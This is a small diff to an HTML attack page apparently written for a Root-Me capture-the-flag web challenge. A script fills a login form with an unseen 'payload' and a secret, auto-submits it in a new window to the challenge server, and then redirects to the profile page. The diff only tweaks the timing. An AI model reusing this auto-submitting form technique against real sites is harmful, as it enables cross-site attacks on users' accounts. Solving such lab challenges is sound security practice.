@@ -1,5 +1,6 @@
 <html>
   <body>
+    V2
       <form target="_blank" rel="opener" action="http://challenge01.root-me.org:58003/login" method="post">
         <label>Username</label><br>
         <input id="username" name="username"><br>
@@ -15,7 +16,7 @@
 
       document.getElementById('username').value = payload;
       document.getElementById('secret').value = secret;
-      document.location = 'http://challenge01.root-me.org:58003/profile';
+      setTimeout(() => document.location = 'http://challenge01.root-me.org:58003/profile');
       document.querySelector('button').click();
   </script>
 </html>
